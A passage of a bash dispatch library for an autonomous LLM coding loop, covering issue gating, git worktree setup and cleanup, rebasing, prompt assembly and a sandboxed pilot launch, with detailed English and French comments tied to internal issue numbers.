        # structural gate, not a transient failure — retrying will not clear it.
        if ! _is_dispatchable_repo "$REPO"; then
            echo "Error: repo_not_dispatchable — 'senara-solutions/${REPO}' is not a repository the autonomous loop may dispatch into. Dispatchable: ${DISPATCHABLE_REPO_BASENAMES[*]}. This is a structural gate (mika#2046/#2062), not a transient failure; retrying will not clear it." >&2
            printf '{"error":"repo_not_dispatchable","repo":"senara-solutions/%s","reason":"repository outside the dispatch allowlist"}\n' "$REPO" >&2
            exit 1
        fi

        # Validate repo directory exists (mika-platform itself IS PLATFORM_DIR)
        if [ "$REPO" = "$PLATFORM_REPO_NAME" ]; then
            SUB_REPO_DIR="$PLATFORM_DIR"
        else
            SUB_REPO_DIR="$PLATFORM_DIR/$REPO"
        fi
        if [ ! -d "$SUB_REPO_DIR/.git" ] && ! [ -f "$SUB_REPO_DIR/.git" ]; then
            echo "Error: $SUB_REPO_DIR is not a git repository" >&2
            exit 1
        fi

        # Fetch issue — validates it exists and is open, gets labels + title + body
        # + comments. `comments` is fetched HERE, in the same call (mika#2178):
        # `state` is already read below for the issue-close gate, and a second
        # round trip would open a TOCTOU window between the state and the
        # comments — the same one /mika-groom-ticket closed at its step 5a.
        ISSUE_JSON=$(gh issue view "$ISSUE_NUM" --repo "senara-solutions/$REPO" --json state,title,labels,body,comments 2>/dev/null) || {
            echo "Error: Issue #${ISSUE_NUM} not found in senara-solutions/${REPO}. Aborting." >&2
            exit 1
        }

        ISSUE_STATE=$(printf '%s' "$ISSUE_JSON" | jq -r '.state')
        if [ "$ISSUE_STATE" = "CLOSED" ]; then
            # Auto-skip: PR merge (or any other close) raced ahead of the webhook-triggered
            # dispatch enqueue. This is an expected race, not a handler bug — deliver a
            # structured skip result via the canonical _deliver_callback() helper so
            # mika-dev's callback turn can recognise it as a no-op and the audit dashboard
            # can filter on status: "auto_skipped". See mika#988 for the failure mode.
            # Position on human-closes vs PR-closes: treated identically — see plan §Scope.
            #
            # Auto-skip rationale (mika#988):
            # On 2026-05-06 the autonomous loop stalled ~7h because this branch previously
            # did `exit 1`, causing the EXIT trap to wrap the error as HANDLER CRASH.
            # mika-dev read the crash envelope, posted a confirmation question, and idled.
            # The correct exit semantics for foreseeable races: exit 0 + structured JSON
            # delivered via _deliver_callback(). Reserve exit 1 for actual handler bugs.
            # Symptom sessions: callback-476caa1d-ef6d-4bac-a60c-a3c78f9a342d (failure),
            # 40a52d43-f186-4175-9c86-b998aafcf4bb (drift).
            RESULT=$(printf '{"status":"auto_skipped","reason":"issue_closed","issue":"senara-solutions/%s#%s","note":"Issue was already closed before dispatch fired. Presumed handled."}' "$REPO" "$ISSUE_NUM")
            _deliver_callback
            exit 0
        fi

        # Branch-name derivation is centralized in mika-platform/scripts/derive-branch-name.
        # See senara-solutions/mika-platform#58 for context on the drift class this eliminates.
        ISSUE_BODY=$(printf '%s' "$ISSUE_JSON" | jq -r '.body // empty')
        ISSUE_TITLE=$(printf '%s' "$ISSUE_JSON" | jq -r '.title')
        LABELS=$(printf '%s' "$ISSUE_JSON" | jq -r '[.labels[].name] | join(",")' 2>/dev/null)

        BRANCH=$("$PLATFORM_DIR/scripts/derive-branch-name" \
            --title "$ISSUE_TITLE" \
            --issue "$ISSUE_NUM" \
            --labels "$LABELS" \
            --body-callout "$ISSUE_BODY")

        # --- Gate: refuse a redundant dev-groom re-dispatch (mika#2012) ---
        #
        # A ticket whose plan is already committed on the dispatch branch does
        # not need grooming. Before this gate, mika-dev (an LLM) chose the
        # `skill` field with nothing deterministic behind it, so an already-
        # groomed ticket could be re-dispatched as dev-groom; the run re-derived
        # the plan, stacked a second body callout, and the ticket came back
        # around — 25 measured requeues across 5 tickets in 13 h, producing 6
        # branches containing only markdown.
        #
        # Exit semantics are mika#988's: _deliver_callback + exit 0. An `exit 1`
        # on a foreseeable condition is wrapped as HANDLER CRASH by the EXIT
        # trap; mika-dev then reads a crash envelope and idles (7 h stall,
        # 2026-05-06). This is a foreseeable condition, so it exits 0.
        if [ "$SKILL" = "dev-groom" ]; then
            local existing_plan plan_provenance
            if existing_plan=$(_committed_plan_on_branch "$SUB_REPO_DIR" "$BRANCH" "$ISSUE_BODY" "$REPO" "$ISSUE_NUM"); then
                # mika#2034: say what was measured. The old wording asserted
                # "already committed on branch" for a blob the branch had merely
                # inherited from main — an attestation produced beside the thing
                # it attests.
                plan_provenance=$(_plan_provenance "$SUB_REPO_DIR" "$BRANCH" "$existing_plan")
                echo "dispatch_gate_groom_refused: repo=${REPO} issue=${ISSUE_NUM} branch=${BRANCH} plan=${existing_plan} — plan resolves on the branch (${plan_provenance}) and its header does not claim another ticket; re-grooming would loop (mika#2012, provenance mika#2034)" >&2
                # mika#2484 U5 — la note ne prescrit plus une route morte.
                # Elle disait « Dispatch dev-pilot to implement », et depuis
                # mika#2287 cette moitié mène droit à
                # `dispatch_grooming_not_verified` : la porte exige un callback
                # groom terminé portant `Outcome: PLAN_GROOMED`, qu'aucun
                # `already_groomed` ne frappe — délibérément, une garde qui lit
                # sa preuve de la revendication ne peut pas la réfuter. Le geste
                # nommé ici est celui que `groom_provenance_verdict` nomme déjà
                # dans son champ `recovery`. Un texte de remède qui nomme une
                # route morte coûte un tour de boucle et une lecture.
                RESULT=$(printf '{"status":"auto_skipped","reason":"already_groomed","issue":"senara-solutions/%s#%s","branch":"%s","plan":"%s","provenance":"%s","note":"The plan named by this ticket resolves on the dispatch branch (%s) and its header does not claim a different ticket. Re-grooming would re-derive it and stack a second body callout. Do NOT dispatch dev-pilot: since mika#2287 the provenance gate refuses it with dispatch_grooming_not_verified unless a completed groom callback carrying Outcome: PLAN_GROOMED exists, and this skip mints none. To make the ticket dispatchable, remove the plan from the branch AND the grooming callouts from the issue body, then let the loop re-groom it."}' \
                    "$REPO" "$ISSUE_NUM" "$BRANCH" "$existing_plan" "$plan_provenance" "$plan_provenance")
                _deliver_callback
                exit 0
            elif grep -qE -- '^> - \*\*Plan:\*\*' <<<"$ISSUE_BODY"; then
                # Grooming is ALLOWED here — the gate correctly declined to fire
                # because no plan is committed on the branch. But this is not a
                # first grooming either: the body claims a plan that isn't there
                # (never pushed, deleted, or the path drifted). Left silent, a
                # second grooming of the same ticket is indistinguishable from a
                # first one, which is how #2012 ran three hours unnoticed. Say so
                # in terms distinct from the refusal, so a `grep` separates the
                # two populations (mika#2012 U4).
                echo "dispatch_gate_groom_allowed_stale_callout: repo=${REPO} issue=${ISSUE_NUM} branch=${BRANCH} — issue body carries a Plan callout but no plan file is committed on the branch; re-grooming proceeds (mika#2012)" >&2
            fi
        fi

        # mika#2155: claim the ticket for the loop BEFORE the first mutation
        # below — the fetch, the non-canonical worktree removal, the
        # `worktree add`. Placed after every no-dispatch exit above (closed
        # issue, redundant groom) so a dispatch that never happens never claims,
        # and skipped on a dry run for the same reason. `|| true`: AC2, the
        # label is a signal, not a barrier. ISSUE_SEAT_CLAIMED is set even when
        # the stamp failed: it means "this dispatch went past its no-dispatch
        # exits", not "the write succeeded" — the EXIT trap releases on it.
        if [ "$DRY_RUN" != "true" ] && [ "$DRY_RUN" != "1" ]; then
            _stamp_issue_seat "$REPO" "$ISSUE_NUM" "$LABELS" || true
            ISSUE_SEAT_CLAIMED=1
        fi

        # Sync main before branching to avoid stale worktrees.
        git -C "$SUB_REPO_DIR" fetch origin main 2>/dev/null || true

        # Worktree path is centralized in mika-platform/scripts/derive-worktree-path
        #
        # mika#1943 — la racine. Le code de sortie n'était pas vérifié, et ce
        # fichier n'a ni `set -e` ni `set -u` : un script absent (il vit dans
        # mika-platform, un AUTRE dépôt, donc son absence n'est pas une
        # hypothèse d'école) ou en échec rendait une chaîne vide qui se
        # propageait en silence jusqu'à la comparaison d'égalité ci-dessous —
        # laquelle ÉLIT une cible de suppression — puis jusqu'aux deux
        # `worktree remove --force`.
        #
        # Le `|| WORKTREE_DIR=""` efface délibérément toute sortie produite par
        # un appel qui a échoué : un script qui sort non-zéro en ayant tout de
        # même imprimé quelque chose n'a rien prouvé, et c'est le sens sûr.
        # Abandonner le dispatch est le bon arbitrage — il n'y a rien à faire
        # sans worktree, et `return 1` est déjà la sortie d'échec de cette
        # fonction (cf. `worktree_setup_failed` plus bas).
        WORKTREE_DIR=$("$PLATFORM_DIR/scripts/derive-worktree-path" --branch "$BRANCH" --repo "$REPO") || WORKTREE_DIR=""
        if [ -z "$WORKTREE_DIR" ]; then
            echo "[dispatch-lib] worktree_path_derivation_failed: branch=$BRANCH repo=$REPO script=$PLATFORM_DIR/scripts/derive-worktree-path — aborting rather than propagating an empty path to a removal site (mika#1943)" >&2
            return 1
        fi

        # --- Pre-flight: detect and clean up non-canonical worktree paths (mika#1472) ---
        # Before the canonical dashed-path collision check below, detect if the target
        # branch is already checked out at a DIFFERENT (non-canonical) worktree path —
        # e.g. a slashed-path relic from before the derive-worktree-path invariant
        # (worktree_path_slug == sanitize(branch_ref)). If found, stash any dirty state
        # (mirroring _clean_worktree_for_rebase's discipline from mika#1414) and remove
        # the relic so the subsequent worktree add can proceed on the canonical path.
        local existing_wt
        existing_wt=$(git -C "$SUB_REPO_DIR" worktree list --porcelain 2>/dev/null \
            | awk -v b="refs/heads/$BRANCH" '/^worktree / {wt = substr($0, 10)} $0 == "branch " b {print wt; exit}')
        # mika#1943: `$WORKTREE_DIR` en tête, et non vide. C'est la comparaison
        # qui ÉLIT la cible du `worktree remove --force` ci-dessous : avec un
        # côté vide, TOUT worktree existant devient « non canonique ». La racine
        # ci-dessus rend le cas inatteignable ; on pose quand même le terme,
        # parce qu'une garde qui dépend d'un seul point de contrôle en amont
        # n'est pas une garde.
        if [ -n "$WORKTREE_DIR" ] && [ -n "$existing_wt" ] && [ "$existing_wt" != "$WORKTREE_DIR" ]; then
            echo "[dispatch-lib] pre-flight: branch $BRANCH is checked out at non-canonical path $existing_wt (canonical: $WORKTREE_DIR); cleaning up relic" >&2
            if [ -d "$existing_wt" ]; then
                local dirty_state
                dirty_state=$(git -C "$existing_wt" status --porcelain 2>/dev/null || true)
                if [ -n "$dirty_state" ]; then
                    local stash_name
                    stash_name="dispatch-lib-stale-worktree-cleanup-$(printf '%s' "$BRANCH" | tr / -)-$(date -u +%Y%m%dT%H%M%SZ)"
                    if git -C "$existing_wt" stash push --include-untracked -m "$stash_name" >/dev/null 2>&1; then
                        local stash_sha
                        stash_sha=$(git -C "$existing_wt" rev-parse --verify --quiet 'stash@{0}' 2>/dev/null || true)
                        # mika#2449: the recovery hint names the CANONICAL worktree,
                        # never `$SUB_REPO_DIR` (the primary/deployment checkout) and
                        # never `$existing_wt` (removed fourteen lines below, so the
                        # hint would fail the moment an operator reads it). Applying a
                        # worktree's uncommitted state in the primary checkout is the
                        # exact signature of the 2026-09-21 incident (staged+modified
                        # on main, `pull --ff-only` refused). The stash stack is shared
                        # repo-wide, so the SHA resolves from any worktree of the repo.
                        # Held by a source scan in test-dispatch-lib.sh (allowlist empty).
                        echo "[dispatch-lib] stashed dirty state from $existing_wt as: $stash_name (sha: ${stash_sha:-<unknown>}; recover with: git -C $WORKTREE_DIR stash apply ${stash_sha:-<sha>} — in the canonical worktree, NOT in the primary checkout)" >&2
                    else
                        echo "[dispatch-lib] stash push failed or nothing to stash in $existing_wt; proceeding with remove" >&2
                    fi
                fi
            fi
            # mika#1943: le relic vient du registre git, donc `git worktree
            # remove` le refuserait s'il n'en était pas un — mais c'est git qui
            # protège, pas dispatch-lib, et un registre porte ce qu'on y a mis.
            # Sur refus on ne supprime pas : le `worktree add` plus bas échouera
            # alors bruyamment (`worktree_setup_failed`), ce qui est le bon sens
            # de l'asymétrie — un worktree résiduel contre une suppression
            # irréversible.
            if _assert_removable_worktree_path "$existing_wt" set_up_worktree_relic; then
                git -C "$SUB_REPO_DIR" worktree remove --force "$existing_wt" 2>/dev/null || true
            fi
        fi

        # Reuse existing worktree if valid
        if [ -d "$WORKTREE_DIR" ] && git -C "$WORKTREE_DIR" rev-parse --git-dir >/dev/null 2>&1; then
            git -C "$WORKTREE_DIR" checkout "$BRANCH" 2>/dev/null || true
        else
            # mika#1943: nettoyage d'une entrée de registre périmée avant le
            # `worktree add`. Sur refus on saute la suppression et on laisse le
            # `add` décider : s'il échoue, il le dit (`worktree_setup_failed`).
            if _assert_removable_worktree_path "$WORKTREE_DIR" set_up_worktree_stale; then
                git -C "$SUB_REPO_DIR" worktree remove --force "$WORKTREE_DIR" 2>/dev/null || true
            fi
            # mika#1311: when origin/$BRANCH already exists from a prior
            # successful dispatch, base the worktree on it (preserves prior
            # history) rather than creating a fresh local branch from
            # origin/main. Without this, re-dispatches after origin/main
            # advances past the prior groom diverge silently — the new
            # local branch has one commit on new main, the remote has the
            # prior groom on older main, and the post-flight push fails
            # with `branch is behind its remote counterpart`. The LLM
            # then correctly escalates to operator (status=blocked) but
            # the queue stays wedged. The downstream BEHIND-block rebases
            # onto origin/main and mika#784's _check_duplicate_commits
            # handles cherry-mark dedup of any merged-but-still-present
            # commits — so basing on origin/$BRANCH first and rebasing
            # afterward composes cleanly with the existing flow.
            # Stderr capture for dual-failure diagnostic (mika#1472 U2).
            # Each worktree add attempt captures stderr to a temp file; on
            # dual-failure, both are emitted as a structured worktree_setup_failed:
            # diagnostic so the operator sees WHY instead of a silent exit-128 trap.
            local wt_err_1="/tmp/wt-add-1-err.$$" wt_err_2="/tmp/wt-add-2-err.$$"
            local wt_add_ok=0
            if git -C "$SUB_REPO_DIR" ls-remote --exit-code origin "refs/heads/$BRANCH" >/dev/null 2>&1; then
                git -C "$SUB_REPO_DIR" fetch origin "$BRANCH" 2>/dev/null || true
                if git -C "$SUB_REPO_DIR" worktree add -b "$BRANCH" "$WORKTREE_DIR" "origin/$BRANCH" 2>"$wt_err_1"; then
                    wt_add_ok=1
                elif git -C "$SUB_REPO_DIR" worktree add "$WORKTREE_DIR" "$BRANCH" 2>"$wt_err_2"; then
                    wt_add_ok=1
                fi
            else
                if git -C "$SUB_REPO_DIR" worktree add -b "$BRANCH" "$WORKTREE_DIR" origin/main 2>"$wt_err_1"; then
                    wt_add_ok=1
                elif git -C "$SUB_REPO_DIR" worktree add "$WORKTREE_DIR" "$BRANCH" 2>"$wt_err_2"; then
                    wt_add_ok=1
                fi
            fi
            if [ "$wt_add_ok" -eq 0 ]; then
                echo "[dispatch-lib] worktree_setup_failed: branch=$BRANCH path=$WORKTREE_DIR" >&2
                echo "  attempt 1 (with -b): $(cat "$wt_err_1" 2>/dev/null)" >&2
                echo "  attempt 2 (without -b): $(cat "$wt_err_2" 2>/dev/null)" >&2
                rm -f "$wt_err_1" "$wt_err_2"
                return 1
            fi
            rm -f "$wt_err_1" "$wt_err_2"
        fi

        # mika#2249 D1: declare the worktree to the engine.
        #
        # The engine's silent-stall reaper needs to know where this dispatch is
        # writing, and this is the ONLY place that knows: WORKTREE_DIR comes from
        # `scripts/derive-worktree-path`, and re-deriving it on the Rust side is
        # the duplication mika-platform#58 closed. The engine pre-created the
        # declaration file's directory and passed its path in
        # MIKA_DISPATCH_WORKTREE_FILE; one line lands there, no new channel.
        #
        # Written after the whole reuse-or-create block, not only after a fresh
        # `worktree add`: a re-dispatch onto an existing worktree is exactly as
        # capable of stalling silently, and skipping it there would leave the
        # most-repeated dispatches unwatched.
        #
        # Every failure is silent by design. An undeclared dispatch is invisible
        # to the reaper — which is the safe direction — and a dispatch that
        # aborted because it could not write a diagnostic file would trade a
        # missed detection for a broken loop.
        if [ -n "${MIKA_DISPATCH_WORKTREE_FILE:-}" ]; then
            if printf '%s\n' "$WORKTREE_DIR" > "$MIKA_DISPATCH_WORKTREE_FILE" 2>/dev/null; then
                echo "[dispatch-lib] dispatch_worktree_declared: $WORKTREE_DIR -> $MIKA_DISPATCH_WORKTREE_FILE (mika#2249)" >&2
            else
                echo "[dispatch-lib] dispatch_worktree_declare_failed: could not write $MIKA_DISPATCH_WORKTREE_FILE; this dispatch will not be watched for a silent stall (mika#2249)" >&2
            fi
        fi

        # mika#2123 kept this rebase deliberately, and it is worth saying why: the
        # promotion-time gate added in `auto_pull` has no checkout, so it only
        # ever *measures*. This is still the only place anything is rebased.
        #
        # Every outcome is emitted under one greppable `rebase_gate` key, because
        # the question the gate cannot answer from its own side — is the loop
        # still refreshing anything, or has the gate grown so strict that nothing
        # reaches here? — needs a number. A gate refusing everything and a world
        # with nothing left to refresh look identical from this side without it.
        #
        # The rationale sits ABOVE the anchor line on purpose: test 12g reads the
        # region from `Rebase-or-abort guard` to the first `fi`, and both the
        # comment length and any extra `if` block in between would silently
        # shrink what that guard can see.
        #
        # Rebase-or-abort guard
        BEHIND=$(git -C "$WORKTREE_DIR" rev-list --count HEAD..origin/main 2>/dev/null || echo 0)
        if [ "$BEHIND" -gt 0 ]; then
            # mika#1414: guarantee a clean tree before rebase on the resume path —
            # a reused worktree can carry dirty state (dominant case: a stale
            # .claude/commands/mika.md from `make deploy`) that would otherwise
            # abort the rebase with a misleading REBASE_CONFLICT and re-block the
            # task. Rationale + tier design live in _clean_worktree_for_rebase.
            _clean_worktree_for_rebase "$WORKTREE_DIR"

            # Capture rebase stderr instead of discarding to /dev/null (mika#1364 AC#4).
            local rebase_err
            rebase_err=$(mktemp "${TMPDIR:-/tmp}/dispatch-lib-rebase-err.XXXXXX")
            if git -C "$WORKTREE_DIR" rebase origin/main 2>"$rebase_err"; then
                echo "Rebased ${BRANCH} onto origin/main (${BEHIND} commits caught up)." >&2
                echo "[dispatch-lib] rebase_gate: branch=${BRANCH} behind=${BEHIND} ran=1 result=ok" >&2
                rm -f "$rebase_err"
            else
                # Capture conflict list and rebase reason BEFORE --abort resets the index.
                CONFLICTS=$(git -C "$WORKTREE_DIR" diff --name-only --diff-filter=U 2>/dev/null | tr '\n' ' ')
                local rebase_reason rebase_mode
                rebase_reason=$(cat "$rebase_err" 2>/dev/null | head -20)
                if [ -n "$CONFLICTS" ]; then
                    rebase_mode="conflict"
                else
                    rebase_mode="other"
                fi
                git -C "$WORKTREE_DIR" rebase --abort 2>/dev/null || true
                rm -f "$rebase_err"
                echo "[dispatch-lib] rebase_gate: branch=${BRANCH} behind=${BEHIND} ran=1 result=${rebase_mode}" >&2
                RESULT="STATUS=REBASE_CONFLICT
Branch ${BRANCH} is ${BEHIND} commits behind origin/main.
Rebase failure mode: ${rebase_mode}
Conflicted files: ${CONFLICTS:-<none>}
Rebase stderr: ${rebase_reason:-<empty>}
Resolve manually before re-dispatching ${REPO}#${ISSUE_NUM}."
                exit 1
            fi
        else
            echo "[dispatch-lib] rebase_gate: branch=${BRANCH} behind=0 ran=0 result=skipped" >&2
        fi

        # Copy gitignored .claude/ config into worktree (relay + permissions only)
        mkdir -p "$WORKTREE_DIR/.claude"
        cp "$PLATFORM_DIR/.claude/claude-pilot.json" "$WORKTREE_DIR/.claude/" 2>/dev/null || true
        cp "$PLATFORM_DIR/.claude/settings.local.json" "$WORKTREE_DIR/.claude/" 2>/dev/null || true
        # Seed meta-repo orchestration slash commands for the inner session.
        # Invariants (no-clobber of the worktree's tracked commands; clean git
        # status) live in _seed_worktree_slash_commands (mika#1173, #1255, #1415).
        #
        # Snapshot semantics: the copy is taken at worktree-creation time; a
        # platform-root command edited mid-session is not picked up. Acceptable
        # because worktrees are short-lived and mid-session command edits
        # violate slug-immutability (mika#844).
        _seed_worktree_slash_commands "$PLATFORM_DIR" "$WORKTREE_DIR"

        CWD_ARGS="--cwd $WORKTREE_DIR"
        if [ -f "$WORKTREE_DIR/.claude/claude-pilot.json" ]; then
            CWD_ARGS="$CWD_ARGS --relay-config $WORKTREE_DIR/.claude/claude-pilot.json"
        elif [ -f "$PLATFORM_DIR/.claude/claude-pilot.json" ]; then
            CWD_ARGS="$CWD_ARGS --relay-config $PLATFORM_DIR/.claude/claude-pilot.json"
        fi

        # The prompt becomes the QUALIFIED issue reference.
        # Must use `${REPO}#${ISSUE_NUM}` (not bare `#${ISSUE_NUM}`) — see mika#138.
        PROMPT="${REPO}#${ISSUE_NUM}"

        # Append iteration context if provided
        if [ -n "$ITERATION_CTX" ]; then
            ITERATION_CTX=$(printf '%s' "$ITERATION_CTX" | head -c 4096)
            PROMPT=$(printf '%s#%s\n\nITERATION CONTEXT:\n%s' "$REPO" "$ISSUE_NUM" "$ITERATION_CTX")
        fi

        # --- mika#2178: the ticket text reaches the pilot ---
        #
        # Three position invariants hold this site in place; each has a named
        # consequence if violated.
        #
        #  1. AFTER the ITERATION_CTX branch above. That branch REASSIGNS PROMPT
        #     from scratch instead of appending to it, so injecting before it
        #     drops the context silently on every iteration.
        #  2. AFTER the anchored repo#N parse at the top of this function
        #     (`^([a-zA-Z0-9_-]+/)?[a-zA-Z0-9_-]+#[0-9]+$`). Injecting before it
        #     makes the regex miss, dispatch falls through to free-text mode and
        #     NO worktree is created. First-order regression.
        #  3. INSIDE _set_up_worktree, therefore before _detect_plan_on_branch
        #     and _handle_dry_run. The entry command is not arbitrated yet at
        #     this point, which is exactly what gives both entry paths
        #     (`/ce-work <plan>` and `/mika`) the same context with no
        #     conditional branch — and what makes the result observable in the
        #     dry-run JSON `prompt` field without launching a model.
        #
        # The FIRST LINE of PROMPT stays exactly `<repo>#<num>`: the mika#138
        # contract and invariant 2 both depend on it.
        #
        # Duplication on the no-callout path is deliberate: `.claude/commands/
        # mika.md` re-fetches the body there, so it arrives twice. Bounded cost
        # (≤ 16 KiB) against one rule — "the pilot always has the ticket text" —
        # with no conditional on an entry command that does not exist yet. A
        # conditional would buy a few kilobytes and pay in asymmetry between the
        # two paths, which is the very defect class this closes.
        local TICKET_CONTEXT
        TICKET_CONTEXT=$(printf '%s' "$ISSUE_JSON" | _render_ticket_context "$REPO" "$ISSUE_NUM")
        if [ -n "$TICKET_CONTEXT" ]; then
            PROMPT=$(printf '%s\n\n%s' "$PROMPT" "$TICKET_CONTEXT")
        fi

        # --- mika#2211: the PR-body containment rule reaches the pilot ---
        #
        # The rule belongs HERE and not only in a `.claude/commands/mika.md`,
        # because this is the one channel every pilot of every repo reads. The
        # pilot is launched with exactly two inputs (see `_run_pilot_sandboxed
        # claude-pilot … --command "$ENTRY_COMMAND" … -- "$PROMPT"`): the entry
        # command, resolved from the TARGET repo's worktree, and this PROMPT.
        # `skills/bundled/self-dev/system_prompt.md` is mika-dev's own system
        # prompt and never reaches the pilot process — a guard placed there
        # alone would be decorative for the failure it is meant to close. So
        # `mika`'s command file carries the canonical form (mika#2211 AC1),
        # mika-dev's prompt carries the rule for what IT composes (AC2), and
        # this line is what covers `mika-cloud` / `mika-skills`, whose command
        # files still hold the pre-fix inline instruction.
        #
        # Appended AFTER the ticket context, so the same three position
        # invariants documented above still hold, and the FIRST LINE of PROMPT
        # is still exactly `<repo>#<num>` (the mika#138 contract).
        PROMPT=$(printf '%s\n\n%s' "$PROMPT" "$_PR_BODY_CONTAINMENT_RULE")

        # --- mika#2306: la prescription Fire-Disposition atteint le groomeur ---
        #
        # Conditionnée au skill, à la différence des deux injections ci-dessus.
        # Celles-là sont inconditionnelles et ont raison de l'être — le corps du
        # ticket et la règle de corps de PR servent tout pilote. Celle-ci
        # s'adresse à qui ÉCRIT un plan ; l'injecter pour `dev-pilot` serait du
        # bruit dans le prompt d'un pilote qui n'en écrit pas. La condition est
        # donc à écrire explicitement, jamais à hériter du voisin : la copier
        # sans elle est exactement l'écart que le contrôle négatif T3 attrape.
        #
        # Appendue APRÈS les deux autres, donc les trois invariants de position
        # documentés plus haut tiennent toujours et la PREMIÈRE LIGNE de PROMPT
        # reste exactement `<repo>#<num>` (contrat mika#138, invariant 2).
        if [ "$SKILL" = "dev-groom" ]; then
            PROMPT=$(printf '%s\n\n%s' "$PROMPT" "$_FIRE_DISPOSITION_RULE")
        fi

        # Save pre-run HEAD SHA for post-flight diff check
        PRE_RUN_HEAD=$(git -C "$WORKTREE_DIR" rev-parse HEAD 2>/dev/null || true)
        # Save pre-run remote HEAD for pilot push guard (mika#1318).
        # Empty if branch doesn't exist on remote yet.
        PRE_RUN_REMOTE_HEAD=$(git -C "$WORKTREE_DIR" ls-remote origin "refs/heads/$BRANCH" 2>/dev/null | cut -f1 || true)
    else
        # --- Free-text mode: pass prompt as-is, no worktree ---
        PRE_RUN_HEAD=""
        PRE_RUN_REMOTE_HEAD=""
        LOG_ID="$TASK_ID"
        CWD_ARGS="--cwd $PLATFORM_DIR"

        if [ -n "$ITERATION_CTX" ]; then
            echo "Warning: iteration_context provided but prompt is not in repo#number format — ignoring" >&2
        fi
    fi
}

_handle_dry_run() {
    if [ "$DRY_RUN" = "true" ] || [ "$DRY_RUN" = "1" ]; then
        if [ -n "$REPO" ] && [ -n "$ISSUE_NUM" ]; then
            jq -n --arg repo "$REPO" --argjson issue "$ISSUE_NUM" --arg branch "$BRANCH" \
                --arg worktree "$WORKTREE_DIR" --arg prompt "$PROMPT" \
                --arg entry_command "$ENTRY_COMMAND" \
                '{dry_run:true, repo:$repo, issue:$issue, branch:$branch, worktree_dir:$worktree, prompt:$prompt, entry_command:$entry_command}'
            # mika#1943: cinquième site destructif, absent de la table du plan et
            # trouvé à la lecture. L'invariant du Product Contract porte sur
            # *tout* site de suppression, pas sur la liste énumérée.
            if _assert_removable_worktree_path "$WORKTREE_DIR" handle_dry_run; then
                git -C "$SUB_REPO_DIR" worktree remove --force "$WORKTREE_DIR" 2>/dev/null || true
            fi
            # `rmdir` n'est pas gardé, et c'est mesuré plutôt que négligé : il ne
            # retire qu'un répertoire VIDE, donc il ne peut emporter aucun
            # contenu — la classe de l'incident du 28/07 lui est inatteignable.
            PARENT_DIR=$("$PLATFORM_DIR/scripts/derive-worktree-path" --branch "$BRANCH" --no-repo) || PARENT_DIR=""
            [ -n "$PARENT_DIR" ] && rmdir "$PARENT_DIR" 2>/dev/null || true
        else
            jq -n --arg prompt "$PROMPT" \
                '{dry_run:true, repo:null, issue:null, branch:null, worktree_dir:null, prompt:$prompt}'
        fi
        exit 0
    fi
}

_run_claude_pilot() {
    local ENTRY_COMMAND="$1"

    # Unit 3 (mika#1282): flag for dirty-worktree rescue, checked by Unit 2.
    RESCUED_DIRTY_WORKTREE=0
    # mika#2151: SHAs of rescue commits produced during THIS dispatch, and the
    # subset already reported on a PR. Reset here, per dispatch, deliberately:
    # the detector has no backlog — it never scans history, open PRs, or
    # existing branches, so its first fire is necessarily a live event. The
    # reset is also what makes a LATER dispatch's second rescue speak again.
    RESCUE_COMMITS=""
    RESCUE_COMMITS_SIGNALLED=""
    POST_RUN_HEAD=""
    # mika#1772: set when a guardrail killed the session, read by the caller.
    PILOT_SESSION_TERMINATED=0

    STDERR_FILE=$(mktemp)
    STDOUT_FILE=$(mktemp)
    # Persistent stderr copy for post-mortem forensics (mika#1097 Step 0-A).
    # The mktemp file above is deleted after callback delivery; this copy persists
    # alongside the claude-pilot log file so operators can inspect it independently.
    _pilot_log_dir; PERSISTENT_STDERR="$_PILOT_LOG_DIR/${LOG_ID}.stderr"
    # Event-stream capture is `--verbose`, passed unconditionally on the run
    # below — there is no trace flag to add, and adding one would abort the
    # launch (mika#2043).
    #
    # This spot used to build a `--trace` flag from CLAUDE_PILOT_TRACE, citing
    # mika#1097 Step 0-B. Only Step 0-B's dispatch-lib half ever shipped:
    # claude-pilot has never accepted `--trace` (no such argument in
    # `_build_parser`, and `git log -S` finds no commit that ever added one).
    # Measured against the installed CLI with this exact argv, an unknown flag
    # is NOT swallowed — argparse exits 2 with `unrecognized arguments` before
    # the session starts, so arming the old env var would have killed every
    # dispatch of the skill that set it.
    #
    # What `--verbose` gives you, for the zero-artifact diagnosis Step 0-B was
    # written for: every text content block (`log_text`), the init event's
    # session_id and model (`log_init`), a marker for turns that produced
    # nothing observable (`log_turn_summary`, cpp#10), any unhandled SDK message
    # type (`log_unhandled_message`, cpp#123), and the raw stream — StreamEvent
    # plus tool-result UserMessage (`log_verbose`, cpp#125). Raw `thinking`
    # blocks are the one thing it does not surface; that needs a ticket on
    # claude-pilot, not a flag here.
    # mika#1705: pilot-transcript capture. When MIKA_LOG_PILOT_TRANSCRIPTS is on,
    # the mika-spirit executor injects ANTHROPIC_LOG_FILE into this handler's env
    # (AFTER its MIKA_* scrub, since this handler cannot read MIKA_* itself), and
    # points it at ~/.mika/data/pilot-transcripts/<task-id>.jsonl. claude-pilot
    # inherits our env, so ANTHROPIC_LOG_FILE flows through to the subprocess,
    # where claude-pilot-py appends one JSONL line per LLM call. The mika engine
    # tick then ingests finished files into the pilot_transcripts table. Nothing
    # to do here except NOT clobber the inherited env before the run below.
    set +e
    # mika#1996: from here on there is a pilot cycle to judge. Sole writer —
    # the non-empty-output gate reads this to tell "the cycle produced nothing"
    # apart from "no cycle ran", and a second writer would blur the two.
    PILOT_RAN=1
    # CWD_ARGS is intentionally word-split (multiple flags)
    # shellcheck disable=SC2086
    # mika#2165: --log-dir is VALUED, not bare. Bare, it fell through to
    # claude-pilot's own Python `const`, which no override here could move and
    # which the bind could therefore never be guaranteed to cover.
    _pilot_log_dir; _run_pilot_sandboxed claude-pilot --verbose --log-dir "$_PILOT_LOG_DIR" --task-id "$LOG_ID" --command "$ENTRY_COMMAND" $CWD_ARGS -- "$PROMPT" >"$STDOUT_FILE" 2>"$STDERR_FILE"
    PILOT_EXIT=$?
    # Persist stderr to durable file before any processing (mika#1097).
    # Scrub secrets from the persistent copy to prevent durable secret retention (mika#903).
    if [ -s "$STDERR_FILE" ]; then
        mkdir -p "$(dirname "$PERSISTENT_STDERR")" 2>/dev/null || true
        _scrub_secrets_from_output < "$STDERR_FILE" > "$PERSISTENT_STDERR" 2>/dev/null || echo "Warning: failed to persist stderr to $PERSISTENT_STDERR" >&2
    fi
    # mika#2165 (AC3): a missing session log can no longer be silent.
    #
    # The internal half already exists and does NOT fire here: claude-pilot's
